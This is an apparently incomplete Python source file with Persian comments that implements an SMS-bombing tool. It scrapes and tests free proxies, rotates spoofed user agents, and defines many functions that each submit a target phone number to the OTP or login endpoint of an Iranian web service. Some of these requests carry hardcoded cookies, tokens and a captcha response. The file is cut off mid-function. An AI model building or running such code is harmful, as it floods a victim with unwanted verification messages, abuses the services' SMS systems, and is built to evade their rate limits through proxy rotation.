from platform import node, system, release
from os import system, name
from re import match, sub
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
from time import sleep, time
from requests import get, post, options, Session
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import random
import threading
from queue import Queue
import json
from fake_useragent import UserAgent
import socket
import socks
import requests

# غیرفعال کردن هشدارهای SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ================ مدیریت پیشرفته پروکسی ================
class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.working_proxies = []
        self.proxy_queue = Queue()
        self.lock = threading.Lock()
        self.last_update = 0
        self.update_interval = 300  # بروزرسانی هر 5 دقیقه
        
    def fetch_proxies_from_sources(self):
        """دریافت پروکسی از منابع مختلف"""
        all_proxies = []
        sources = [
            self._fetch_from_proxyscrape,
            self._fetch_from_geonode,
            self._fetch_from_proxylist,
            self._fetch_from_freeproxy
        ]
        
        with ThreadPoolExecutor(max_workers=4) as executor:
            futures = [executor.submit(source) for source in sources]
            for future in as_completed(futures):
                try:
                    proxies = future.result(timeout=5)
                    all_proxies.extend(proxies)
                except:
                    continue
        
        return list(set(all_proxies))  # حذف تکراری‌ها
    
    def _fetch_from_proxyscrape(self):
        """دریافت پروکسی از proxyscrape"""
        try:
            url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
            response = get(url, timeout=5)
            if response.status_code == 200:
                return [f"http://{proxy.strip()}" for proxy in response.text.split('\n') if proxy.strip()]
        except:
            pass
        return []
    
    def _fetch_from_geonode(self):
        """دریافت پروکسی از geonode"""
        try:
            url = "https://proxylist.geonode.com/api/proxy-list?limit=50&page=1&sort_by=lastChecked&sort_type=desc&protocols=http%2Chttps"
            response = get(url, timeout=5)
            if response.status_code == 200:
                data = response.json()
                return [f"http://{p['ip']}:{p['port']}" for p in data.get('data', [])]
        except:
            pass
        return []
    
    def _fetch_from_proxylist(self):
        """دریافت پروکسی از proxylist"""
        try:
            url = "https://www.proxy-list.download/api/v1/get?type=http"
            response = get(url, timeout=5)
            if response.status_code == 200:
                return [f"http://{proxy.strip()}" for proxy in response.text.split('\n') if proxy.strip()]
        except:
            pass
        return []
    
    def _fetch_from_freeproxy(self):
        """دریافت پروکسی از freeproxy"""
        try:
            url = "https://free-proxy-list.net/"
            response = get(url, timeout=5)
            if response.status_code == 200:
                import re
                proxies = re.findall(r'(\d+\.\d+\.\d+\.\d+):(\d+)', response.text)
                return [f"http://{ip}:{port}" for ip, port in proxies[:50]]
        except:
            pass
        return []
    
    def test_proxy(self, proxy):
        """تست پروکسی برای بررسی سرعت و عملکرد"""
        try:
            start_time = time()
            session = Session()
            session.proxies = {'http': proxy, 'https': proxy}
            session.timeout = 3
            
            # تست با چند سایت مختلف
            test_urls = [
                'http://httpbin.org/ip',
                'https://api.github.com',
                'http://www.google.com'
            ]
            
            for url in test_urls:
                try:
                    response = session.get(url, timeout=3, verify=False)
                    if response.status_code == 200:
                        response_time = time() - start_time
                        if response_time < 2:  # پروکسی باید سریع باشه
                            return True, response_time
                except:
                    continue
            return False, float('inf')
        except:
            return False, float('inf')
    
    def update_proxies(self):
        """بروزرسانی لیست پروکسی‌های فعال"""
        current_time = time()
        if current_time - self.last_update < self.update_interval and self.working_proxies:
            return self.working_proxies
        
        print(f'{y}[*] Updating proxy list...{w}')
        
        # دریافت پروکسی از منابع
        all_proxies = self.fetch_proxies_from_sources()
        
        if not all_proxies:
            # پروکسی‌های پیشفرض اگر منبعی در دسترس نبود
            all_proxies = [
                'http://127.0.0.1:8080',
                'http://127.0.0.1:1080',
            ]
        
        # تست پروکسی‌ها به صورت همزمان
        working = []
        with ThreadPoolExecutor(max_workers=30) as executor:
            future_to_proxy = {executor.submit(self.test_proxy, proxy): proxy for proxy in all_proxies[:100]}
            for future in as_completed(future_to_proxy):
                proxy = future_to_proxy[future]
                try:
                    is_working, response_time = future.result(timeout=3)
                    if is_working:
                        working.append((proxy, response_time))
                except:
                    continue
        
        # مرتب‌سازی بر اساس سرعت
        working.sort(key=lambda x: x[1])
        self.working_proxies = [p[0] for p in working[:30]]  # نگه داشتن 30 تا از سریع‌ترین‌ها
        
        # پر کردن صف
        for proxy in self.working_proxies:
            self.proxy_queue.put(proxy)
        
        self.last_update = current_time
        print(f'{g}[+] Found {len(self.working_proxies)} working proxies{w}')
        return self.working_proxies
    
    def get_proxy(self):
        """دریافت یک پروکسی از صف"""
        if self.proxy_queue.empty():
            self.update_proxies()
        
        try:
            return self.proxy_queue.get_nowait()
        except:
            return random.choice(self.working_proxies) if self.working_proxies else None

# ================ مدیریت User-Agent ================
class UserAgentManager:
    def __init__(self):
        self.ua = UserAgent()
        self.custom_agents = [
            # موبایل
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 11; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
            
            # دسکتاپ
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0',
        ]
        self.current_index = 0
        self.lock = threading.Lock()
    
    def get_random(self):
        """دریافت User-Agent تصادفی"""
        with self.lock:
            if random.random() > 0.7:  # 70% مواقع از لیست ثابت استفاده کن
                return random.choice(self.custom_agents)
            try:
                return self.ua.random
            except:
                return random.choice(self.custom_agents)
    
    def get_rotating(self):
        """دریافت User-Agent به صورت چرخشی"""
        with self.lock:
            agent = self.custom_agents[self.current_index]
            self.current_index = (self.current_index + 1) % len(self.custom_agents)
            return agent

# ================ Session با پروکسی ================
def create_session_with_proxy(proxy_manager, ua_manager):
    """ایجاد سشن با پروکسی و User-Agent"""
    session = Session()
    
    # تنظیمات retry
    retry_strategy = Retry(
        total=1,
        backoff_factor=0.1,
        status_forcelist=[429, 500, 502, 503, 504],
    )
    adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=50, pool_maxsize=50)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    
    # تنظیم پروکسی
    proxy = proxy_manager.get_proxy()
    if proxy:
        session.proxies = {'http': proxy, 'https': proxy}
    
    # تنظیم User-Agent
    session.headers.update({
        'User-Agent': ua_manager.get_random(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    })
    
    return session

# ================ توابع ارسال درخواست با پروکسی ================
def send_request_with_proxy(func, phone, proxy_manager, ua_manager, results_counter):
    """ارسال درخواست با استفاده از پروکسی"""
    session = None
    try:
        session = create_session_with_proxy(proxy_manager, ua_manager)
        
        # جایگزینی session در تابع اصلی
        original_post = post
        original_get = get
        
        def patched_post(*args, **kwargs):
            kwargs['timeout'] = 2
            kwargs['verify'] = False
            return session.post(*args, **kwargs)
        
        def patched_get(*args, **kwargs):
            kwargs['timeout'] = 2
            kwargs['verify'] = False
            return session.get(*args, **kwargs)
        
        # موقتاً توابع اصلی را جایگزین کن
        import builtins
        builtins.post = patched_post
        builtins.get = patched_get
        
        result = func(phone)
        
        # برگرداندن توابع اصلی
        builtins.post = original_post
        builtins.get = original_get
        
        with results_counter['lock']:
            if result:
                results_counter['success'] += 1
            results_counter['total'] += 1
        
        return result
        
    except Exception as e:
        with results_counter['lock']:
            results_counter['total'] += 1
            results_counter['failed'] += 1
        return False
    finally:
        if session:
            session.close()

# ================ کد اصلی با تغییرات ================

# تعریف توابع ارسال درخواست (همان توابع قبلی)
def classino(phone):
    classino_url = "https://panel.classino.com/api/v1/auth/login"
    classino_data = {"mobile": "0" + phone.split("+98")[1]}
    classino_headers = {
        "Authorization": "Bearer null",
        "User-Agent": "uvicorn",
        "Origin": "https://panel.classino.com",
        "Referer": "https://panel.classino.com/",
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*"
    }
    try:
        response = post(classino_url, json=classino_data, headers=classino_headers, timeout=2)
        if response.status_code == 200:
            print(f'{g}(Classino) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def alibaba(phone):
    alibaba_url = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
    alibaba_data = {"phoneNumber": "0" + phone.split("+98")[1]}
    alibaba_headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "X-Client-Name": "WEB-NEW,PRODUCTION,CSR,www.alibaba.ir,mobile,Mobile Safari,16.6,iPhone,Apple,iOS,16.7.10,3.204.8",
        "X-Request-Id": "1759695456554",
        "X-Request-Sign": "3HavSnLx3FyA5XofiPT1Gf",
        "X-Client-Version": "mobile,Mobile Safari,16.6,iPhone,Apple,iOS",
        "Content-Type": "application/json; charset=utf-8; v=3",
        "X-Requested-With": "Identity"
    }
    try:
        response = post(alibaba_url, json=alibaba_data, headers=alibaba_headers, timeout=2)
        if response.status_code == 200 and response.json().get("success") == True:
            print(f'{g}(Alibaba) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def tetherland(phone):
    tetherland_url = "https://service.tetherland.com/api/v5/login-register"
    tetherland_data = {
        "mobile": "0" + phone.split("+98")[1],
        "device_info": {
            "brand": "Apple",
            "model": "iPhone",
            "browserVersion": "16.6",
            "app_version": "",
            "by": "web",
            "osName": "iOS",
            "osVersion": "16.7.10",
            "browserName": "Mobile Safari",
            "platform": "web",
            "name": "iOS",
            "device": "web"
        },
        "otp_type": "sms",
        "device": "web"
    }
    tetherland_headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
    }
    try:
        response = post(tetherland_url, json=tetherland_data, headers=tetherland_headers, timeout=2)
        if response.status_code == 200 and response.json().get("status") == True:
            print(f'{g}(Tetherland) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def jabama(phone):
    jabama_url = "https://gw.jabama.com/api/v4/account/send-code"
    jabama_data = {"mobile": "0" + phone.split("+98")[1]}
    jabama_headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json;charset=utf-8",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "X-Client-Info": "GuestPWA,Vue2.86.2,iOS,16.7.10,undefined,9e711798-8b56-4472-bbef-9643ebb35901",
        "X-Experiments": "836a2c1b0aa74e51-PLP_SORT_EXPERIMENT,PLP_SORT_EXPERIMENT:TREATMENT,CANCELLATION_RESELL,CANCELLATION_RESELL:TREATMENT,CHAT_BEHAIVIOR,CHAT_BEHAIVIOR:TREATMENT,GPR_MODAL,GPR_MODAL:TREATMENT,MOBILE_PDP_GOFTINO,MOBILE_PDP_GOFTINO:TREATMENT,INSTANT_RESERVATION_HINT,INSTANT_RESERVATION_HINT:TREATMENT,SNAPPPAY_BNPL_EXPERIMENT:ALL_OPEN,NEW_PAYMENT_FUNNEL,NEW_PAYMENT_FUNNEL:TREATMENT,VAT_WITH_SERVICE,VAT_WITH_SERVICE:,NEW_CITY_SEARCH,NEW_CITY_SEARCH:,NEW_PLP_SEARCH,NEW_PLP_SEARCH:,NEW_PLP_SEARCH_ALL-VILLAS2,NEW_PLP_SEARCH_ALL-VILLAS2:,METRIC_VARIANCE:A,T50,T50:,force_login,force_login:TREATMENT,ADS_V0,ADS_V0:,SEARCH_OPTIMIZATION,SEARCH_OPTIMIZATION:MULTIMETRIC,SERVICE_FEE_5,SERVICE_FEE_5:,PAYMENT_TYPE_FEE:TREATMENT,HS_AI_AGENT,HS_AI_AGENT:TREATMENT,APP_USER_LOCATION,APP_USER_LOCATION:TREATMENT",
        "Accept": "application/json; charset=utf-8"
    }
    try:
        response = post(jabama_url, json=jabama_data, headers=jabama_headers, timeout=2)
        if response.status_code == 200 and response.json().get("success") == True:
            print(f'{g}(Jabama) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def mobit(phone):
    mobit_url = "https://api.mobit.ir/api/web/v8/register/register"
    mobit_data = {
        "number": "0" + phone.split("+98")[1],
        "hash_1": 1759696242,
        "hash_2": "5dc6c5fe19f1146acc75716845527a7e693e1fe9f0f4ee4d2fbce9d597ce9745"
    }
    mobit_headers = {
        "Accept": "application/json",
        "User-Agent": "mobit_web",
        "Origin": "https://www.mobit.ir",
        "Referer": "https://www.mobit.ir/",
        "Content-Type": "application/json;charset=utf-8",
        "Accept": "application/json; charset=UTF-8"
    }
    try:
        response = post(mobit_url, json=mobit_data, headers=mobit_headers, timeout=2)
        if response.status_code == 200 and response.json().get("success") == True:
            print(f'{g}(Mobit) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def smarket(phone):
    smarketU = f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{phone.split("+98")[1]}'
    smarketH = {'accept': '*/*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-type': 'text/plain;charset=UTF-8',
'origin': 'https://snapp.market',
'referer': 'https://snapp.market/',
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33'}
    try:
        smarketR = post(timeout=2, url=smarketU, headers=smarketH).json()
        if smarketR['status'] == True:
            print(f'{g}(SnapMarket) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def okorosh(phone):
    okJ = {
    "mobile": "0"+phone.split("+98")[1],
    "g-recaptcha-response": "03AGdBq255m4Cy9SQ1L5cgT6yD52wZzKacalaZZw41D-jlJzSKsEZEuJdb4ujcJKMjPveDKpAcMk4kB0OULT5b3v7oO_Zp8Rb9olC5lZH0Q0BVaxWWJEPfV8Rf70L58JTSyfMTcocYrkdIA7sAIo7TVTRrH5QFWwUiwoipMc_AtfN-IcEHcWRJ2Yl4rT4hnf6ZI8QRBG8K3JKC5oOPXfDF-vv4Ah6KsNPXF3eMOQp3vM0SfMNrBgRbtdjQYCGpKbNU7P7uC7nxpmm0wFivabZwwqC1VcpH-IYz_vIPcioK2vqzHPTs7t1HmW_bkGpkZANsKeDKnKJd8dpVCUB1-UZfKJVxc48GYeGPrhkHGJWEwsUW0FbKJBjLO0BdMJXHhDJHg3NGgVHlnOuQV_wRNMbUB9V5_s6GM_zNDFBPgD5ErCXkrE40WrMsl1R6oWslOIxcSWzXruchmKfe"
}
    okU = 'https://my.okcs.com/api/check-mobile'
    okH = {'accept': 'application/json, text/plain, */*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-type': 'application/json;charset=UTF-8',
'cookie': '_ga=GA1.2.1201761975.1639324247; XSRF-TOKEN=eyJpdiI6IllzYkQvdHJ5NVp3M1JyZmYweWFDTGc9PSIsInZhbHVlIjoiZ0wxQUZjR2ZzNEpPenFUZUNBZC95c2RFaEt4Y2x4VWJ2QlBmQ1ZIbUJHV2VEOGt0VG1XMXBaOVpJUFBkK2NOZmNvckxibDQ5cDkxc2ZJRkhJQUY4RlBicU80czIvZWhWZm1OSnJZMXZEbXE4TnlVeGZUSDhSYU9PRzZ6QzZGMkYiLCJtYWMiOiI2NWZlOTkxMTBjZDA5NzkyNDgwMjk2NGEwMDQzMGVhM2U1ODEzNmQ1YjExY2Q1ODc5MDFmZDBhMmZjMjQwY2JjIn0%3D; myokcs_session=eyJpdiI6InlYaXBiTUw1dHFKM05rN0psNjlwWXc9PSIsInZhbHVlIjoiNDg1QWJQcGwvT3NUOS9JU1dSZGk2K2JkVlNVV2wrQWxvWGVEc0d1MDR1aTNqVSs4Z0llSDliMW04ZFpGTFBUOG82NEJNMVFmTmNhcFpzQmJVTkpQZzVaUEtkSnFFSHU0RFprcXhWZlY0Zit2UHpoaVhLNXdmdUZYN1RwTnVLUFoiLCJtYWMiOiI5NTUwMmI2NDhkNWJjNDgwOGNmZjQxYTI4YjA0OTFjNTQ5NDc0YWJiOWIwZmI4MTViMWM0NDA4OGY5NGNhOGIzIn0%3D',
'origin': 'https://my.okcs.com',
'referer': 'https://my.okcs.com/',
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33',
'x-requested-with': 'XMLHttpRequest',
'x-xsrf-token': 'eyJpdiI6IllzYkQvdHJ5NVp3M1JyZmYweWFDTGc9PSIsInZhbHVlIjoiZ0wxQUZjR2ZzNEpPenFUZUNBZC95c2RFaEt4Y2x4VWJ2QlBmQ1ZIbUJHV2VEOGt0VG1XMXBaOVpJUFBkK2NOZmNvckxibDQ5cDkxc2ZJRkhJQUY4RlBicU80czIvZWhWZm1OSnJZMXZEbXE4TnlVeGZUSDhSYU9PRzZ6QzZGMkYiLCJtYWMiOiI2NWZlOTkxMTBjZDA5NzkyNDgwMjk2NGEwMDQzMGVhM2U1ODEzNmQ1YjExY2Q1ODc5MDFmZDBhMmZjMjQwY2JjIn0='}
    try:
        okR = post(timeout=2, url=okU, headers=okH, json=okJ).text
        if 'success' in okR:
            print(f'{g}(OfoghKourosh) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def snap(phone):
    snapH = {"Host": "app.snapp.taxi", "content-length": "29", "x-app-name": "passenger-pwa", "x-app-version": "5.0.0", "app-version": "pwa", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", "content-type": "application/json", "accept": "*/*", "origin": "https://app.snapp.taxi", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://app.snapp.taxi/login/?redirect_to\u003d%2F", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "_gat\u003d1"}
    snapD = {"cellphone":phone}
    try:
        snapR = post(timeout=2, url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD).text
        if "OK" in snapR:
            print(f'{g}(Snap) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def gap(phone):
    gapH = {"Host": "core.gap.im","accept": "application/json, text/plain, */*","x-version": "4.5.7","accept-language": "fa","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","appversion": "web","origin": "https://web.gap.im","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://web.gap.im/","accept-encoding": "gzip, deflate, br"}
    try:
        gapR = get(timeout=2, url="https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone.split("+")[1]), headers=gapH).text
        if "OK" in gapR:
            print(f'{g}(Gap) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def tap30(phone):
    tap30H = {"Host": "tap33.me","Connection": "keep-alive","Content-Length": "63","User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "application/json","Accept": "*/*","Origin": "https://app.tapsi.cab","Sec-Fetch-Site": "cross-site","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://app.tapsi.cab/","Accept-Encoding": "gzip, deflate, br","Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    tap30D = {"credential":{"phoneNumber":"0"+phone.split("+98")[1],"role":"PASSENGER"}}
    try:
        tap30R = post(timeout=2, url="https://tap33.me/api/v2/user", headers=tap30H, json=tap30D).json()
        if tap30R['result'] == "OK":
            print(f'{g}(Tap30) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def divar(phone):
    divarH = {'accept': 'application/json, text/plain, */*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-type': 'application/x-www-form-urlencoded',
'origin': 'https://divar.ir',
'referer': 'https://divar.ir/',
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
'x-standard-divar-error': 'true'}
    divarD = {"phone":phone.split("+98")[1]}
    try:
        divarR = post(timeout=2, url="https://api.divar.ir/v5/auth/authenticate", headers=divarH, json=divarD).json()
        if divarR["authenticate_response"] == "AUTHENTICATION_VERIFICATION_CODE_SENT":
            print(f'{g}(Divar) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def torob(phone):
    phone = '0'+phone.split('+98')[1]
    torobH = {'accept': '*/*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'cookie': 'abtest=next_pwa; search_session=ofwjiyqqethomevqrgzxvopjtgkgimdc; _gcl_au=1.1.805505755.1639260830; _gid=GA1.2.683761449.1639260830; _gat_UA-105982196-1=1; _ga_CF4KGKM3PG=GS1.1.1639260830.1.0.1639260830.0; _clck=130ifw1|1|ex6|0; _ga=GA1.2.30224238.1639260830',
'origin': 'https://torob.com',
'referer': 'https://torob.com/',
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'}
    try:
        torobR = get(timeout=2, url=f"https://api.torob.com/a/phone/send-pin/?phone_number={phone}", headers=torobH).json()
        if torobR["message"] == "pin code sent":
            print(f'{g}(Torob) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def one(phone):
    a = "http://app.insatel.ir/client_webservices.php"
    b = f"ac=10&appname=fk&phonenumber={phone}&token=mw0yDKRVld&serial=null&keyname=verify2"
    d = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "85",
        "Host": "app.insatel.ir",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/3.12.1"
    }
    try:
        response = post(a, data=b, headers=d, timeout=2)
        return response.status_code == 200
    except:
        return False

def two(phone):
    a = "http://setmester.com/mrfallowtel_glp/client_webservices4.php"
    b = f"ac=9&username=gyjoo8uyt&password=123456&fullname=hkurdds6&phonenumber={phone}&token=1uhljuqBpI&serial=null"
    d = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "110",
        "Host": "setmester.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/3.12.1"
    }
    try:
        response = post(a, data=b, headers=d, timeout=2)
        return response.status_code == 200
    except:
        return False

def tree(phone):
    a = "http://jozamoza.com/com.cyberspaceservices.yb/client_webservices4.php"
    b = f"ac=9&username=sjwo7ehd&password=123456&fullname=dheoe9dy&phonenumber={phone}&token=qqcI33qkGC&serial=null"
    d = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "109",
        "Host": "jozamoza.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/3.12.1"
    }
    try:
        response = post(a, data=b, headers=d, timeout=2)
        return response.status_code == 200
    except:
        return False

def fwor(phone):
    a = "https://api.nazdika.com/v3/account/request-login/"
    b = f"phone={phone}"
    d = {
        "Accept": "Application/JSON",
        "User-Agent": ",29;Xiaomi M90077J70CG;LTE",
        "X-ODD-User-Agent": "Mozilla/9.0 (Linux; Android 10; M9007J540CG Build/QKQ1.97512.002; wv) AppleWebKit/9977.36 (KHTML, like Gecko) Version/4.0 Chrome/2000.0.4896.127 Mobile Safari/999.36",
        "X-ODD-Operator": "IR-MCI,IR-MCI",
        "X-ODD-SOURCE": "Nazdika-v-1140",
        "X-ODD-MARKET": "googlePlay",
        "X-ODD-IDENTIFIER": "null",
        "X-ODD-ANDROID-ID": "lllllllllllll666llllllllll",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "17",
        "Host": "api.nazdika.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip"
    }
    try:
        response = post(a, data=b, headers=d, timeout=2)
        return response.status_code == 200
    except:
        return False

def five(phone):
    a = "http://followmember2022.ir/followmember/client_webservices4.php"
    b = f"ac=10&phonenumber={phone}&token=CLTRIcCmcT&serial=null"
    d = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "58",
        "Host": "followmember2022.ir",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/3.12.1"
    }
    try:
        response = post(a, data=b, headers=d, timeout=2)
        return response.status_code == 200
    except:
        return False

def six(phone):
    a = "https://iranstor1.ir/index.php/api/login?sms.ir"
    b = f"fullname=alimahmoodiu&mobile={phone}&device_id=12365478911&token=c5aef1158542ea0932c1916f829d943c"
    d = {
        "Host": "iranstor1.ir",
        "key": "d41d8cd98f00b204e9800998ecf8427e",
        "apptoken": "VdOIvN6tHdgjNrmCr0PvSg==:NTU1ZDBhNGNiODY0NzgyNA==",
        "content-type": "application/x-www-form-urlencoded",
        "content-length": "115",
        "accept-encoding": "gzip",
        "cookie": "ci_session=181bfd8fd175d83b156a57e477afc7edbc703522",
        "user-agent": "okhttp/3.5.0"
    }
    try:
        response = post(a, data=b, headers=d, timeout=2)
        return response.status_code == 200
    except:
        return False

def seven(phone):
    a = "https://homa.petabad.com/customer/signup"
    b = f"my_server_api_version=1&platform=android&my_app_type=android&my_app_version=17&time_zone_offset=270&app_name=customer&phone_number={phone}"
    d = {
        "user-agent": "Dart/2.14 (dart:io)",
        "content-type": "application/x-www-form-urlencoded; charset=utf-8",
        "accept-encoding": "gzip",
        "content-length": "142",
        "host": "homa.petabad.com"
    }
    try:
        response = post(a, data=b, headers=d, timeout=2)
        return response.status_code == 200
    except:
        return False

def eyit(phone):
    a = "https://takhfifan.com/api/jsonrpc/1_0/"
    b = {"id": 592419288011976410, "method": "customerExistOtp", "params": ["023804109885a10d02158eef65c5d887", {"username": phone}]}
    d = {
        "Host": "takhfifan.com",
        "x-session": "023804109885a10d02158eef65c5d887",
        "content-type": "takhfifanApp/json",
        "content-length": "126",
        "accept-encoding": "gzip",
        "user-agent": "okhttp/3.14.9"
    }
    try:
        response = post(a, json=b, headers=d, timeout=2)
        return response.status_code == 200
    except:
        return False

def niyne(phone):
    a = "http://baharapp.xyz/api/v1.1/reqSMS.php"
    b = f"phone={phone}&"
    d = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 100; M2007J208CG MIUI/V12.0.9.0.QJGMIXM)",
        "Host": "baharapp.xyz",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "Content-Length": "18"
    }
    try:
        response = post(a, data=b, headers=d, timeout=2)
        return response.status_code == 200
    except:
        return False

def ten(phone):
    a = "http://serverpv1.xyz/api/v1/reqSMS"
    b = f"phone={phone}&"
    d = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 100; M2007J208CG MIUI/V12.0.9.0.QJGMIXM)",
        "Host": "serverpv1.xyz",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "Content-Length": "18"
    }
    try:
        response = post(a, data=b, headers=d, timeout=2)
        return response.status_code == 200
    except:
        return False

def eleven(phone):
    a = "http://kolbeapp.xyz/api/v1/reqSMS"
    b = f"phone={phone}&"
    d = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 100; M2007J208CG MIUI/V12.0.9.0.QJGMIXM)",
        "Host": "kolbeapp.xyz",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "Content-Length": "18"
    }
    try:
        response = post(a, data=b, headers=d, timeout=2)
        return response.status_code == 200
    except:
        return False

def tovelf(phone):
    a = "http://arezooapp.xyz/api/v1/reqSMS"
    b = f"phone={phone}&"
    d = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 100; M2007J208CG MIUI/V12.0.9.0.QJGMIXM)",
        "Host": "arezooapp.xyz",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "Content-Length": "18"
